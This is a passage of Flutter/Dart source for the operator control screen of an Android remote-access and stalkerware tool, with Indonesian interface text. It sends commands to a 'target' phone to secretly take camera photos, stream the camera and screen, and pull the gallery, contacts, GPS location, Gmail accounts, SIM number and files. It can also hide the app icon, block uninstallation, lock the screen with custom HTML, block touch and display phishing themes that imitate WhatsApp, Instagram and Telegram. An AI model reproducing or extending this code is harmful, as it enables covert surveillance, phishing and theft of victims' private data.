import 'dart:convert';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:path_provider/path_provider.dart';
import 'package:provider/provider.dart';
import 'package:share_plus/share_plus.dart';

import '../models/device_model.dart';
import '../services/auth_service.dart';
import '../services/command_service.dart';
import '../services/socket_service.dart';
import '../theme/app_theme.dart';
import '../theme/app_typography.dart';
import '../widgets/base64_image.dart';
import '../widgets/control_hero_video.dart';
import '../widgets/control_tile.dart';
import '../utils/device_payload.dart';
import '../widgets/prompt_dialog.dart';
import '../widgets/sync_widgets.dart';
import 'stream_viewer_screen.dart';
import 'live_chat_screen.dart';

class DeviceControlScreen extends StatefulWidget {
  const DeviceControlScreen({super.key, this.embedded = false, this.onPickDevice});

  final bool embedded;
  final VoidCallback? onPickDevice;

  @override
  State<DeviceControlScreen> createState() => _DeviceControlScreenState();
}

class _DeviceControlScreenState extends State<DeviceControlScreen> {
  final _cmd = CommandService();
  bool _busy = false;

  Future<void> _run(String command, [dynamic value]) async {
    final socket = context.read<SocketService>();
    final token = context.read<AuthService>().token;
    final id = socket.selectedDeviceId;
    if (id == null) return;

    setState(() => _busy = true);
    try {
      if (token == null) return;
      await _cmd.send(token: token, deviceId: id, command: command, value: value);
    } catch (e) {
      if (mounted) showSyncSnack(context, e.toString(), error: true);
    } finally {
      if (mounted) setState(() => _busy = false);
    }
  }

  Future<void> _takeScreenshot(String facing) async {
    final socket = context.read<SocketService>();
    final token = context.read<AuthService>().token;
    final id = socket.selectedDeviceId;
    if (id == null) return;

    setState(() => _busy = true);
    try {
      if (token == null) return;
      await _cmd.send(token: token, deviceId: id, command: 'camera', value: facing);
      await Future<void>.delayed(const Duration(milliseconds: 2500));
      final frame = await _cmd.fetchScreenshot(token: token, deviceId: id);
      await _cmd.send(token: token, deviceId: id, command: 'camera', value: 'off');
      if (!mounted) return;
      _showPhotoDialog(facing == 'front' ? 'Depan' : 'Belakang', frame);
    } catch (e) {
      if (token != null) {
        await _cmd.send(token: token, deviceId: id, command: 'camera', value: 'off');
      }
      if (mounted) showSyncSnack(context, e.toString(), error: true);
    } finally {
      if (mounted) setState(() => _busy = false);
    }
  }

  void _showPhotoDialog(String label, String frame) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: ElegantCard.surface,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(AppRadius.md),
          side: BorderSide(color: AppColors.dashAccent.withValues(alpha: 0.12)),
        ),
        title: Text('Foto $label', style: AppTypography.menuTitle()),
        content: SizedBox(height: 260, child: Base64Image(data: frame, borderRadius: BorderRadius.circular(12))),
        actions: [
          FilledButton(
            style: FilledButton.styleFrom(backgroundColor: AppColors.dashAccent, foregroundColor: Colors.white),
            onPressed: () => Navigator.pop(context),
            child: const Text('Tutup'),
          ),
        ],
      ),
    );
  }

  void _showTextSheet(String title, String body) {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (_) => DraggableScrollableSheet(
        expand: false,
        initialChildSize: 0.45,
        maxChildSize: 0.8,
        builder: (_, scroll) => Container(
          decoration: BoxDecoration(
            color: ElegantCard.surface,
            borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
            border: Border.all(color: AppColors.neoBlack, width: 3),
          ),
          child: ListView(
            controller: scroll,
            padding: const EdgeInsets.all(18),
            children: [
              Text(title, style: AppTypography.menuTitle().copyWith(fontSize: 16)),
              const SizedBox(height: 12),
              Text(body, style: AppTypography.menuSubtitle()),
            ],
          ),
        ),
      ),
    );
  }

  Future<void> _downloadFile(String path, String name) async {
    final socket = context.read<SocketService>();
    final token = context.read<AuthService>().token;
    final id = socket.selectedDeviceId;
    if (id == null) return;

    setState(() => _busy = true);
    try {
      if (token == null) return;
      final bytes = await _cmd.downloadFile(token: token, deviceId: id, path: path);
      final dir = await getTemporaryDirectory();
      final file = File('${dir.path}/$name');
      await file.writeAsBytes(bytes);
      await Share.shareXFiles([XFile(file.path)], text: name);
      if (mounted) showSyncSnack(context, 'File siap dibagikan', success: true);
    } catch (e) {
      if (mounted) showSyncSnack(context, e.toString(), error: true);
    } finally {
      if (mounted) setState(() => _busy = false);
    }
  }

  void _showFilesSheet(List<Map<String, dynamic>> items, String rootPath) {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (_) => DraggableScrollableSheet(
        expand: false,
        initialChildSize: 0.65,
        maxChildSize: 0.9,
        builder: (_, scroll) => Container(
          decoration: BoxDecoration(
            color: ElegantCard.surface,
            borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
            border: Border.all(color: AppColors.neoBlack, width: 3),
          ),
          child: Column(
            children: [
              const SizedBox(height: 10),
              Container(width: 40, height: 4, decoration: BoxDecoration(color: AppColors.dashAccent.withValues(alpha: 0.2), borderRadius: BorderRadius.circular(99))),
              Padding(
                padding: const EdgeInsets.all(18),
                child: Text('Files · $rootPath', style: AppTypography.menuTitle().copyWith(fontSize: 16)),
              ),
              Expanded(
                child: items.isEmpty
                    ? Center(child: Text('Belum ada data', style: AppTypography.menuSubtitle()))
                    : ListView.separated(
                        controller: scroll,
                        itemCount: items.length,
                        separatorBuilder: (_, __) => Divider(height: 1, color: AppColors.dashAccent.withValues(alpha: 0.08)),
                        itemBuilder: (_, i) {
                          final file = items[i];
                          final name = file['name']?.toString() ?? '-';
                          final isDir = file['isDir'] == true || file['isDirectory'] == true;
                          final fullPath = file['path']?.toString() ?? '$rootPath$name';
                          return ListTile(
                            leading: Icon(isDir ? Icons.folder_outlined : Icons.insert_drive_file_outlined, color: AppColors.dashAccent),
                            title: Text(name, style: AppTypography.menuSubtitle().copyWith(fontWeight: FontWeight.w600)),
                            subtitle: isDir ? null : Text('Tap untuk download', style: AppTypography.welcomeMeta()),
                            onTap: isDir
                                ? null
                                : () {
                                    Navigator.pop(context);
                                    _downloadFile(fullPath, name);
                                  },
                          );
                        },
                      ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _showGallerySheet(List<Map<String, dynamic>> photos) {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (_) => DraggableScrollableSheet(
        expand: false,
        initialChildSize: 0.75,
        maxChildSize: 0.92,
        builder: (_, scroll) => Container(
          decoration: BoxDecoration(
            color: ElegantCard.surface,
            borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
            border: Border.all(color: AppColors.neoBlack, width: 3),
          ),
          child: Column(
            children: [
              const SizedBox(height: 10),
              Container(width: 40, height: 4, decoration: BoxDecoration(color: AppColors.dashAccent.withValues(alpha: 0.2), borderRadius: BorderRadius.circular(99))),
              Padding(
                padding: const EdgeInsets.all(18),
                child: Text('Galeri · ${photos.length} foto', style: AppTypography.menuTitle().copyWith(fontSize: 16)),
              ),
              Expanded(
                child: photos.isEmpty
                    ? Center(child: Text('Belum ada foto / izin galeri belum diberikan', style: AppTypography.menuSubtitle(), textAlign: TextAlign.center))
                    : GridView.builder(
                        controller: scroll,
                        padding: const EdgeInsets.fromLTRB(12, 0, 12, 16),
                        gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                          crossAxisCount: 3,
                          mainAxisSpacing: 8,
                          crossAxisSpacing: 8,
                          childAspectRatio: 0.82,
                        ),
                        itemCount: photos.length,
                        itemBuilder: (_, i) {
                          final photo = photos[i];
                          final name = photo['name']?.toString() ?? 'Foto';
                          final thumb = photo['thumb']?.toString() ?? '';
                          return Column(
                            crossAxisAlignment: CrossAxisAlignment.stretch,
                            children: [
                              Expanded(
                                child: ClipRRect(
                                  borderRadius: BorderRadius.circular(10),
                                  child: thumb.isNotEmpty
                                      ? Base64Image(data: thumb, fit: BoxFit.cover)
                                      : ColoredBox(
                                          color: AppColors.dashAccent.withValues(alpha: 0.08),
                                          child: const Icon(Icons.image_not_supported_outlined, color: AppColors.dashAccent),
                                        ),
                                ),
                              ),
                              const SizedBox(height: 4),
                              Text(name, maxLines: 1, overflow: TextOverflow.ellipsis, style: AppTypography.welcomeMeta().copyWith(fontSize: 10)),
                            ],
                          );
                        },
                      ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _showDataSheet(String title, List<Map<String, dynamic>> items, String Function(Map<String, dynamic>) label) {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (_) => DraggableScrollableSheet(
        expand: false,
        initialChildSize: 0.65,
        maxChildSize: 0.9,
        builder: (_, scroll) => Container(
          decoration: BoxDecoration(
            color: ElegantCard.surface,
            borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
            border: Border.all(color: AppColors.neoBlack, width: 3),
          ),
          child: Column(
            children: [
              const SizedBox(height: 10),
              Container(width: 40, height: 4, decoration: BoxDecoration(color: AppColors.dashAccent.withValues(alpha: 0.2), borderRadius: BorderRadius.circular(99))),
              Padding(
                padding: const EdgeInsets.all(18),
                child: Text(title, style: AppTypography.menuTitle().copyWith(fontSize: 16)),
              ),
              Expanded(
                child: items.isEmpty
                    ? Center(child: Text('Belum ada data', style: AppTypography.menuSubtitle()))
                    : ListView.separated(
                        controller: scroll,
                        itemCount: items.length,
                        separatorBuilder: (_, __) => Divider(height: 1, color: AppColors.dashAccent.withValues(alpha: 0.08)),
                        itemBuilder: (_, i) => ListTile(
                          title: Text(label(items[i]), style: AppTypography.menuSubtitle().copyWith(fontWeight: FontWeight.w600)),
                          dense: true,
                        ),
                      ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Future<void> _urlAction(String title, String command) async {
    final url = await showPromptDialog(context, title: title, hint: 'https://...');
    if (url != null) await _run(command, url);
  }

  void _openCamPicker(DeviceModel device) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      builder: (_) => Container(
        margin: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          color: ElegantCard.surface,
          borderRadius: BorderRadius.circular(AppRadius.md),
          border: Border.all(color: AppColors.neoBlack, width: 3),
        ),
        child: SafeArea(
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Padding(
                padding: const EdgeInsets.all(16),
                child: Text('Pilih Kamera', style: AppTypography.menuTitle()),
              ),
              ListTile(
                leading: Container(width: 36, height: 36, decoration: BoxDecoration(borderRadius: BorderRadius.circular(10), color: AppColors.dashAccent.withValues(alpha: 0.08)), child: const Icon(Icons.camera_rear_outlined, color: AppColors.dashAccent, size: 20)),
                title: Text('Kamera Belakang', style: AppTypography.menuSubtitle().copyWith(fontWeight: FontWeight.w600)),
                onTap: () { Navigator.pop(context); Navigator.push(context, MaterialPageRoute(builder: (_) => StreamViewerScreen(deviceId: device.id, deviceName: device.name, type: StreamType.camera, facing: 'back'))); },
              ),
              ListTile(
                leading: Container(width: 36, height: 36, decoration: BoxDecoration(borderRadius: BorderRadius.circular(10), color: AppColors.dashAccent.withValues(alpha: 0.08)), child: const Icon(Icons.camera_front_outlined, color: AppColors.dashAccent, size: 20)),
                title: Text('Kamera Depan', style: AppTypography.menuSubtitle().copyWith(fontWeight: FontWeight.w600)),
                onTap: () { Navigator.pop(context); Navigator.push(context, MaterialPageRoute(builder: (_) => StreamViewerScreen(deviceId: device.id, deviceName: device.name, type: StreamType.camera, facing: 'front'))); },
              ),
              const SizedBox(height: 8),
            ],
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final socket = context.watch<SocketService>();
    final device = socket.selectedDevice;

    if (device == null) {
      return Center(
        child: FadeSlideIn(
          child: Padding(
            padding: const EdgeInsets.all(32),
            child: ElegantCard(
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Container(width: 72, height: 72, decoration: BoxDecoration(shape: BoxShape.circle, color: AppColors.dashAccent.withValues(alpha: 0.06), border: Border.all(color: AppColors.dashAccent.withValues(alpha: 0.14))), child: Icon(Icons.phonelink_off_rounded, size: 34, color: AppColors.dashAccent.withValues(alpha: 0.45))),
                  const SizedBox(height: 14),
                  Text('This Is My Era', style: AppTypography.brand(size: 22)),
                  const SizedBox(height: 6),
                  Text('Pilih device untuk kontrol remote', style: AppTypography.menuSubtitle(), textAlign: TextAlign.center),
                  if (widget.onPickDevice != null) ...[
                    const SizedBox(height: 18),
                    SyncPrimaryButton(label: 'PILIH DEVICE', icon: Icons.smartphone_rounded, variant: ButtonVariant.light, onPressed: widget.onPickDevice),
                  ],
                ],
              ),
            ),
          ),
        ),
      );
    }

    return _DeviceControlBody(
      key: ValueKey(device.id),
      device: device,
      busy: _busy,
      onRun: _run,
      onScreenshot: _takeScreenshot,
      onShowData: _showDataSheet,
      onShowText: (body, {title = 'Info'}) => _showTextSheet(title, body),
      onShowFiles: _showFilesSheet,
      onShowGallery: _showGallerySheet,
      onUrlAction: _urlAction,
      onOpenCam: _openCamPicker,
    );
  }
}

class _DeviceControlBody extends StatefulWidget {
  const _DeviceControlBody({
    super.key,
    required this.device,
    required this.busy,
    required this.onRun,
    required this.onScreenshot,
    required this.onShowData,
    required this.onShowText,
    required this.onShowFiles,
    required this.onShowGallery,
    required this.onUrlAction,
    required this.onOpenCam,
  });

  final DeviceModel device;
  final bool busy;
  final Future<void> Function(String command, [dynamic value]) onRun;
  final Future<void> Function(String facing) onScreenshot;
  final void Function(String title, List<Map<String, dynamic>> items, String Function(Map<String, dynamic>) label) onShowData;
  final void Function(String body, {String title}) onShowText;
  final void Function(List<Map<String, dynamic>> items, String rootPath) onShowFiles;
  final void Function(List<Map<String, dynamic>> photos) onShowGallery;
  final Future<void> Function(String title, String command) onUrlAction;
  final void Function(DeviceModel device) onOpenCam;

  @override
  State<_DeviceControlBody> createState() => _DeviceControlBodyState();
}

class _DeviceControlBodyState extends State<_DeviceControlBody> {
  int _tab = 0;

  Widget _section(String title) => Padding(padding: const EdgeInsets.fromLTRB(16, 18, 16, 10), child: Text(title.toUpperCase(), style: AppTypography.statLabel()));

  Widget _commandGrid(List<Widget> children) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 16),
      child: LayoutBuilder(
        builder: (context, constraints) {
          const crossCount = 2;
          const spacing = 10.0;
          const aspect = 0.92;
          final cellWidth = (constraints.maxWidth - spacing) / crossCount;
          final cellHeight = cellWidth / aspect;
          final rows = (children.length / crossCount).ceil();
          final gridHeight = rows * cellHeight + (rows - 1) * spacing;
          return SizedBox(
            height: gridHeight,
            child: GridView.count(
              shrinkWrap: true,
              physics: const NeverScrollableScrollPhysics(),
              crossAxisCount: crossCount,
              mainAxisSpacing: spacing,
              crossAxisSpacing: spacing,
              childAspectRatio: aspect,
              children: children,
            ),
          );
        },
      ),
    );
  }

  String _themeLabel(String value) {
    return switch (value.toLowerCase()) {
      'whatsapp' => 'WhatsApp',
      'instagram' => 'Instagram',
      'youtube' => 'YouTube',
      'telegram' => 'Telegram',
      'xnxx' => 'XNXX',
      _ => 'Default',
    };
  }

  @override
  Widget build(BuildContext context) {
    final socket = context.read<SocketService>();
    final s = widget.device.status;
    final id = widget.device.id;
    const offColor = Color(0xFF37474F);

    return Stack(
      children: [
        ListView(
          physics: const BouncingScrollPhysics(parent: AlwaysScrollableScrollPhysics()),
          padding: const EdgeInsets.fromLTRB(0, 0, 0, 100),
          children: [
            FadeSlideIn(child: Padding(padding: const EdgeInsets.fromLTRB(16, 8, 16, 12), child: ControlHeroVideo(device: widget.device))),
            FadeSlideIn(
              delay: const Duration(milliseconds: 40),
              child: Padding(
                padding: const EdgeInsets.fromLTRB(16, 0, 16, 14),
                child: ElegantCard(
                  padding: const EdgeInsets.all(16),
                  child: Row(
                    children: [
                      Container(
                        width: 36,
                        height: 36,
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(10),
                          color: s.antiUninstall ? const Color(0xFFD50000).withValues(alpha: 0.2) : offColor.withValues(alpha: 0.2),
                        ),
                        child: Icon(Icons.shield_outlined, color: s.antiUninstall ? const Color(0xFFD50000) : offColor, size: 20),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text('Anti Uninstall', style: AppTypography.menuSubtitle().copyWith(fontWeight: FontWeight.w600)),
                            Text(
                              s.antiUninstall ? 'Aktif · Settings Diblokir' : 'Matikan untuk izinkan hapus app',
                              style: AppTypography.welcomeMeta(),
                            ),
                          ],
                        ),
                      ),
                      PinkSwitch(value: s.antiUninstall, onChanged: (v) => widget.onRun('antiUninstall', v ? 'true' : 'false')),
                    ],
                  ),
                ),
              ),
            ),
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 16),
              child: Text('This Is My Era', style: AppTypography.brand(size: 18)),
            ),
            // Tabs — tema neo sama dashboard
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 12, 16, 4),
              child: Row(
                children: [
                  for (final entry in [
                    (0, 'CONTROL', Icons.gamepad_outlined),
                    (1, 'LIVE', Icons.sensors),
                    (2, 'MANAGE', Icons.apps_rounded),
                  ])
                    Expanded(
                      child: Padding(
                        padding: const EdgeInsets.symmetric(horizontal: 4),
                        child: GestureDetector(
                          onTap: () => setState(() => _tab = entry.$1),
                          child: AnimatedContainer(
                            duration: const Duration(milliseconds: 180),
                            padding: const EdgeInsets.symmetric(vertical: 10),
                            decoration: BoxDecoration(
                              color: _tab == entry.$1 ? AppColors.dashAccent : AppColors.dashSurface,
                              borderRadius: BorderRadius.circular(12),
                              border: Border.all(color: AppColors.neoBlack, width: 2.5),
                              boxShadow: _tab == entry.$1 ? NeoShadow.hard(dx: 2, dy: 2) : NeoShadow.hardSm(),
                            ),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                _DynamicIcon(
                                  entry.$3,
                                  size: 15,
                                  color: _tab == entry.$1 ? Colors.white : AppColors.dashText,
                                ),
                                const SizedBox(width: 5),
                                Text(
                                  entry.$2,
                                  style: TextStyle(
                                    color: _tab == entry.$1 ? Colors.white : AppColors.dashText,
                                    fontSize: 11,
                                    fontWeight: FontWeight.w800,
                                    letterSpacing: 0.6,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ),
                      ),
                    ),
                ],
              ),
            ),

            if (_tab == 0) ...[
            _section('Kontrol'),
            _commandGrid([
              ControlTile(title: 'Flashlight', subtitle: s.flashlight ? 'Aktif' : 'Off', icon: Icons.flash_on, color: s.flashlight ? const Color(0xFF00E5FF) : offColor, trailing: PinkSwitch(value: s.flashlight, onChanged: (v) => widget.onRun('flashlight', v))),
              ControlTile(title: 'Lock Device', subtitle: s.deviceLocked ? 'Locked' : 'Off', icon: Icons.lock_outline, color: s.deviceLocked ? const Color(0xFFD50000) : offColor, trailing: PinkSwitch(value: s.deviceLocked, onChanged: (v) async { if (v) { final title = await showPromptDialog(context, title: 'Lock Device', hint: 'Teks di layar kunci', initial: 'Locked', maxLines: 2); if (title == null) return; await widget.onRun('lockDevice', jsonEncode({'title': title.isEmpty ? 'Locked' : title})); } else { await widget.onRun('unlockDevice'); } })),
              ControlTile(title: 'Hide Icon', subtitle: s.iconHidden ? 'Hidden' : 'Visible', icon: s.iconHidden ? Icons.visibility_off : Icons.visibility, color: s.iconHidden ? const Color(0xFFAA00FF) : offColor, onTap: () => widget.onRun('hideIcon', s.iconHidden ? 'false' : 'true')),
              ControlTile(title: 'Stuck Layar', subtitle: s.touchBlocked ? 'Aktif' : 'Off', icon: Icons.touch_app, color: s.touchBlocked ? const Color(0xFFDD2C00) : offColor, trailing: PinkSwitch(value: s.touchBlocked, onChanged: (v) { if (v) { widget.onRun('touchBlock', jsonEncode({'message': '', 'duration': 0})); } else { widget.onRun('touchBlockStop'); } })),
              ControlTile(title: 'TTS', subtitle: s.ttsSpeaking ? 'Speaking' : 'Tap bicara', icon: Icons.record_voice_over_outlined, color: s.ttsSpeaking ? const Color(0xFF00C853) : offColor, onTap: () async { final text = await showPromptDialog(context, title: 'Text to Speech', hint: 'Ketik teks', maxLines: 3); if (text != null) await widget.onRun('ttsSpeak', {'text': text, 'lang': 'id'}); }),
              ControlTile(title: 'Mute Volume', subtitle: s.mutedVolumeLabel, icon: Icons.volume_off, color: s.volumeMuted ? const Color(0xFFB71C1C) : offColor, trailing: PinkSwitch(value: s.volumeMuted, onChanged: (v) => widget.onRun('muteVolume', v ? 'true' : 'false'))),
              ControlTile(title: 'Brightness', subtitle: 'Set Kecerahan', icon: Icons.brightness_6, color: const Color(0xFFFFEA00), onTap: () async { final val = await showPromptDialog(context, title: 'Set Kecerahan', hint: '0 - 255', initial: '200'); if (val != null) await widget.onRun('setBrightness', jsonEncode({'level': int.tryParse(val) ?? 200})); }),
              ControlTile(title: 'Volume', subtitle: 'Set Volume', icon: Icons.volume_up, color: const Color(0xFF40C4FF), onTap: () async { final val = await showPromptDialog(context, title: 'Set Volume', hint: '0 - 15', initial: '10'); if (val != null) await widget.onRun('setVolume', jsonEncode({'level': int.tryParse(val) ?? 10})); }),
              ControlTile(title: 'Foto Depan', subtitle: 'Screenshot', icon: Icons.camera_front_outlined, color: const Color(0xFF1DE9B6), onTap: () => widget.onScreenshot('front')),
              ControlTile(title: 'Foto Belakang', subtitle: 'Screenshot', icon: Icons.camera_rear_outlined, color: const Color(0xFF00E676), onTap: () => widget.onScreenshot('back')),
              ControlTile(title: 'Vibrate', subtitle: 'Getar device', icon: Icons.vibration, color: const Color(0xFF304FFE), onTap: () async { final ms = await showPromptDialog(context, title: 'Vibrate', hint: 'Durasi ms', initial: '1000'); if (ms != null) await widget.onRun('vibrate', ms); }),
              ControlTile(title: 'Toast', subtitle: 'Kirim pesan', icon: Icons.message_outlined, color: const Color(0xFF2979FF), onTap: () async { final msg = await showPromptDialog(context, title: 'Toast Message', hint: 'Pesan', maxLines: 2); if (msg != null) await widget.onRun('showToast', msg); }),
              ControlTile(title: 'Spam Dialog', subtitle: s.dialogSpamActive ? 'Aktif' : 'Tap spam', icon: Icons.notifications_active_outlined, color: s.dialogSpamActive ? const Color(0xFFFF6D00) : offColor, onTap: () async { final msg = await showPromptDialog(context, title: 'Spam Dialog', hint: 'Pesan spam', maxLines: 2); if (msg != null) await widget.onRun('dialogSpam', {'text': msg}); }),
              ControlTile(title: 'Lock Custom', subtitle: s.lockCustomActive ? 'Aktif' : 'Off', icon: Icons.web_asset, color: s.lockCustomActive ? const Color(0xFF6200EA) : offColor, trailing: PinkSwitch(value: s.lockCustomActive, onChanged: (v) async { if (v) { final html = await showPromptDialog(context, title: 'Lock Custom HTML', hint: 'Paste HTML lock screen', maxLines: 6, initial: '<h1 style="color:white;text-align:center">Locked</h1>'); if (html != null) await widget.onRun('lockCustom', html); } else { await widget.onRun('lockCustom', ''); } })),
              ControlTile(title: 'Tema Phishing', subtitle: _themeLabel(s.currentTheme), icon: Icons.palette_outlined, color: const Color(0xFF00C853), onTap: () => _showPhishingThemeSheet(context, widget.onRun)),
            ]),
            
            ], // end tab 0
            if (_tab == 1) ...[
            _section('Live Stream'),
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 16),
              child: Row(
                children: [
                  Expanded(child: ControlTile(title: 'Live Camera', subtitle: s.cameraActive ? 'Live' : 'Back / Front', icon: Icons.videocam_outlined, color: s.cameraActive ? const Color(0xFF00E5FF) : offColor, onTap: () => widget.onOpenCam(widget.device))),
                  const SizedBox(width: 10),
                  Expanded(child: ControlTile(title: 'Live Screen', subtitle: s.screenActive ? 'Live' : 'Start', icon: Icons.screenshot_monitor_outlined, color: s.screenActive ? const Color(0xFF18FFFF) : offColor, onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => StreamViewerScreen(deviceId: id, deviceName: widget.device.name, type: StreamType.screen))))),
                ],
              ),
            ),
            // Lock Chat + tombol CHAT (layout seperti referensi)
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 10, 16, 0),
              child: Container(
                decoration: BoxDecoration(
                  color: AppColors.dashSurface,
                  borderRadius: BorderRadius.circular(AppRadius.md),
                  border: Border.all(color: AppColors.neoBlack, width: 3),
                  boxShadow: NeoShadow.hardSm(),
                ),
                child: Column(
                  children: [
                    Padding(
                      padding: const EdgeInsets.fromLTRB(14, 12, 10, 8),
                      child: Row(
                        children: [
                          Container(
                            width: 42,
                            height: 42,
                            decoration: BoxDecoration(
                              borderRadius: BorderRadius.circular(AppRadius.sm),
                              color: s.lockLiveChatActive ? const Color(0xFF2979FF) : offColor,
                              border: Border.all(color: AppColors.neoBlack, width: 2.5),
                              boxShadow: NeoShadow.hard(dx: 2, dy: 2),
                            ),
                            child: const Icon(Icons.lock_person_outlined, size: 22, color: Colors.white),
                          ),
                          const SizedBox(width: 12),
                          Expanded(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text('Lock Chat', style: AppTypography.menuTitle().copyWith(fontSize: 14)),
                                Text(
                                  s.lockLiveChatActive ? 'LOCKED' : 'UNLOCKED',
                                  style: AppTypography.menuSubtitle().copyWith(fontSize: 11),
                                ),
                              ],
                            ),
                          ),
                          PinkSwitch(
                            value: s.lockLiveChatActive,
                            onChanged: (v) async {
                              if (v) {
                                await widget.onRun('lockLiveChat');
                              } else {
                                await widget.onRun('unlockDevice');
                              }
                            },
                          ),
                        ],
                      ),
                    ),
                    Padding(
                      padding: const EdgeInsets.fromLTRB(14, 0, 14, 12),
                      child: Material(
                        color: Colors.transparent,
                        child: InkWell(
                          onTap: () => Navigator.push(
                            context,
                            MaterialPageRoute(
                              builder: (_) => LiveChatScreen(deviceId: id, deviceName: widget.device.name),
                            ),
                          ),
                          borderRadius: BorderRadius.circular(10),
                          child: Container(
                            width: double.infinity,
                            padding: const EdgeInsets.symmetric(vertical: 12),
                            decoration: BoxDecoration(
                              color: const Color(0xFF1A237E).withValues(alpha: 0.08),
                              borderRadius: BorderRadius.circular(10),
                              border: Border.all(color: AppColors.neoBlack, width: 2.5),
                            ),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                const Icon(Icons.chat_bubble_outline_rounded, size: 18, color: AppColors.dashText),
                                const SizedBox(width: 8),
                                Text(
                                  'CHAT',
                                  style: AppTypography.menuTitle().copyWith(fontSize: 13, letterSpacing: 1.2),
                                ),
                              ],
                            ),
                          ),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            ),
            
            ], // end tab 1
            if (_tab == 2) ...[
            _section('Info Device'),
            _commandGrid([
              ControlTile(title: 'Galeri', subtitle: 'Lihat foto device', icon: Icons.photo_library_outlined, color: const Color(0xFFFFD600), onTap: () async { socket.galleryByDevice.remove(id); await widget.onRun('getGallery'); final photos = await socket.waitForData(socket.galleryByDevice, id, timeout: const Duration(seconds: 20)); if (!context.mounted) return; if (photos.isEmpty) showSyncSnack(context, 'Galeri kosong — cek izin foto di HP target', error: true); widget.onShowGallery(photos); }),
              ControlTile(title: 'Kontak', subtitle: 'Daftar kontak', icon: Icons.contacts_outlined, color: const Color(0xFF00B0FF), onTap: () async { await widget.onRun('getContacts'); await Future<void>.delayed(const Duration(milliseconds: 1500)); widget.onShowData('Kontak', socket.contactsByDevice[id] ?? [], DevicePayload.contactLine); }),
              ControlTile(title: 'GPS', subtitle: 'Lokasi device', icon: Icons.location_on_outlined, color: const Color(0xFF00C853), onTap: () async { await widget.onRun('getLocation'); await Future<void>.delayed(const Duration(milliseconds: 1500)); final loc = socket.locationByDevice[id]; if (loc != null && context.mounted) widget.onShowText(DevicePayload.locationLine(loc)); }),
              ControlTile(title: 'Maps', subtitle: 'Buka peta di HP', icon: Icons.map_outlined, color: const Color(0xFF18FFFF), onTap: () => widget.onRun('openMap', '')),
              ControlTile(title: 'Gmail', subtitle: 'Akun email', icon: Icons.mail_outline, color: const Color(0xFFD50000), onTap: () async { await widget.onRun('getGmail'); await Future<void>.delayed(const Duration(milliseconds: 1500)); widget.onShowText(DevicePayload.gmailSummary(socket.gmailByDevice[id] as Map<String, dynamic>?), title: 'Akun Gmail'); }),
              ControlTile(title: 'Phone', subtitle: 'Nomor SIM', icon: Icons.phone_outlined, color: const Color(0xFF2962FF), onTap: () async { await widget.onRun('getPhone'); await Future<void>.delayed(const Duration(milliseconds: 1500)); widget.onShowText(DevicePayload.phoneSummary(socket.phoneByDevice[id] as Map<String, dynamic>?), title: 'Nomor SIM'); }),
              ControlTile(title: 'Files', subtitle: 'Browse /sdcard', icon: Icons.folder_outlined, color: const Color(0xFFFF9100), onTap: () async { await widget.onRun('getFiles', '/sdcard/'); await Future<void>.delayed(const Duration(milliseconds: 1500)); widget.onShowFiles(socket.filesByDevice[id] ?? [], '/sdcard/'); }),
            ]),
            
            _section('Advanced'),
            _InlineAppManager(
              onFetchApps: () async {
                socket.appsByDevice.remove(id);
                await widget.onRun('getInstalledApps', 'true');
                return await socket.waitForData(socket.appsByDevice, id, timeout: const Duration(seconds: 15));
              },
              onRun: widget.onRun,
              initialBlocked: s.blockedApps,
            ),

            _commandGrid([
              ControlTile(title: 'Video Overlay', subtitle: 'Putar overlay', icon: Icons.play_circle_outline, color: const Color(0xFFD500F9), onTap: () => widget.onRun('videoOverlay')),
              ControlTile(title: 'Stop Overlay', subtitle: 'Matikan overlay', icon: Icons.stop_circle_outlined, color: offColor, onTap: () => widget.onRun('videoOverlayHide')),
              ControlTile(title: 'SOS Video', subtitle: s.sosActive ? 'Aktif' : 'Off', icon: Icons.warning_amber_rounded, color: s.sosActive ? const Color(0xFFD50000) : offColor, trailing: PinkSwitch(value: s.sosActive, onChanged: (v) { if (v) { widget.onRun('sosStart'); } else { widget.onRun('sosStop'); } })),
